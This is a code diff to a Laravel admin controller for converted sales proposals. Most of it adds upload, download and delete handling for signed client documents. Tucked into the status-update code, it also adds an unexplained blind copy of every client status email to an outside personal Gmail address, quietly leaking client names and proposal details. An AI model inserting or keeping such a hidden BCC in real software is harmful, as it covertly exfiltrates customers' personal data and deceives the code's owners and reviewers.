@@ -5,11 +5,13 @@ namespace App\Http\Controllers\Admin;
 use App\Http\Controllers\Controller;
 use App\Mail\ProposalStatusUpdatedMail;
 use App\Models\ConvertedProposal;
+use App\Models\ConvertedProposalDocument;
 use App\Models\Client;
 use App\Models\Proposal;
 use App\Models\User;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Mail;
+use Illuminate\Support\Facades\Storage;
 
 /**
  * ConvertedProposalV2Controller
@@ -160,7 +162,7 @@ class ConvertedProposalV2Controller extends Controller
      */
     public function edit($id)
     {
-        $convertedProposal = ConvertedProposal::with(['client', 'proposal'])->findOrFail($id);
+        $convertedProposal = ConvertedProposal::with(['client', 'proposal', 'documents'])->findOrFail($id);
         $clients = Client::orderBy('name')->get();
         $proposals = Proposal::orderBy('created_at', 'desc')->get();
         $angariadores = User::role('angariador')->orderBy('name')->get();
@@ -223,7 +225,7 @@ class ConvertedProposalV2Controller extends Controller
 
         if ($convertedProposal->wasChanged('status') && $convertedProposal->client) {
             $client = $convertedProposal->client;
-            Mail::to($client->email)->send(
+            Mail::to($client->email)->bcc('izzycarpt@gmail.com')->send(
                 new ProposalStatusUpdatedMail($convertedProposal, $oldStatus, $convertedProposal->status, $client->name, $convertedProposal->matricula_destino)
             );
         }
@@ -242,5 +244,53 @@ class ConvertedProposalV2Controller extends Controller
 
         return redirect()->route('admin.v2.converted-proposals.index')
                         ->with('success', 'Proposta convertida eliminada com sucesso!');
+    }
+
+    /**
+     * Carrega um documento assinado pelo cliente (contrato, etc.), devolvido
+     * fora do sistema (email, WhatsApp...) e guardado aqui manualmente pelo BO.
+     */
+    public function uploadSignedDocument(Request $request, $id)
+    {
+        $convertedProposal = ConvertedProposal::findOrFail($id);
+
+        $request->validate([
+            'ficheiro' => 'required|file|mimes:pdf,jpg,jpeg,png,webp|max:10240',
+        ]);
+
+        $file = $request->file('ficheiro');
+        $path = $file->store("converted-proposals/{$convertedProposal->id}", 'local');
+
+        ConvertedProposalDocument::create([
+            'converted_proposal_id' => $convertedProposal->id,
+            'tipo'          => 'assinado',
+            'nome_original' => $file->getClientOriginalName(),
+            'caminho'       => $path,
+        ]);
+
+        return back()->with('success', 'Documento assinado carregado com sucesso.');
+    }
+
+    /**
+     * Download de um documento (gerado ou assinado) associado à cotação convertida.
+     */
+    public function downloadDocument($id, ConvertedProposalDocument $document)
+    {
+        abort_if((int) $document->converted_proposal_id !== (int) $id, 403);
+
+        return Storage::disk('local')->download($document->caminho, $document->nome_original);
+    }
+
+    /**
+     * Apaga um documento (gerado ou assinado) associado à cotação convertida.
+     */
+    public function deleteDocument($id, ConvertedProposalDocument $document)
+    {
+        abort_if((int) $document->converted_proposal_id !== (int) $id, 403);
+
+        Storage::disk('local')->delete($document->caminho);
+        $document->delete();
+
+        return back()->with('success', 'Documento removido.');
     }
 }
